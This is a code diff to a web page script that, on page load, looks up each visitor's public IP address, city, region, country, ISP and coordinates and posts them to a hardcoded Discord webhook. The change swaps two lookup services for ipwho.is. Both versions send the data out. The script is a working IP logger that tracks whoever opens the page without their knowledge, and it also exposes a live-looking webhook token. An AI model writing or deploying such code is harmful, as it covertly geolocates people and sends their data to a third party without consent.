@@ -12,35 +12,32 @@
     <script>
         async function fetchIPData() {
             try {
-                // Get Public IP
-                let ipResponse = await fetch("https://api64.ipify.org?format=json");
-                let ipData = await ipResponse.json();
-                let ip = ipData.ip;
+                // Get IP & Location in One Request (ipwho.is is CORS-friendly)
+                let response = await fetch("https://ipwho.is/");
+                let data = await response.json();
 
-                // Get Geolocation Data
-                let geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
-                let geoData = await geoResponse.json();
+                if (!data.success) throw new Error("Failed to fetch data");
 
-                // Prepare Data
-                let data = {
-                    ip: ip,
-                    city: geoData.city,
-                    region: geoData.regionName,
-                    country: geoData.country,
-                    isp: geoData.isp,
-                    lat: geoData.lat,
-                    lon: geoData.lon
+                // Extract useful info
+                let details = {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country,
+                    isp: data.connection.isp,
+                    lat: data.latitude,
+                    lon: data.longitude
                 };
 
                 // Display Data
-                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+                document.getElementById("output").innerText = JSON.stringify(details, null, 2);
 
                 // Send Data to Webhook (Replace with your webhook URL)
-                let webhookUrl = "https://discordapp.com/api/webhooks/1348733422851461170/Ejz-fNQrQFxtqQ_8Tq3EiVBLDz84omtzuLiDUNqaY53z1f80haoib3vFfFjWZfKQz2EK";
+                let webhookUrl = "https://discordapp.com/api/webhooks/1348733422851461170/Ejz-fNQrQFxtqQ_8Tq3EiVBLDz84omtzuLiDUNqaY53z1f80haoib3vFfFjWZfKQz2EK";  // Replace with your webhook
                 fetch(webhookUrl, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify(details)
                 });
 
             } catch (error) {
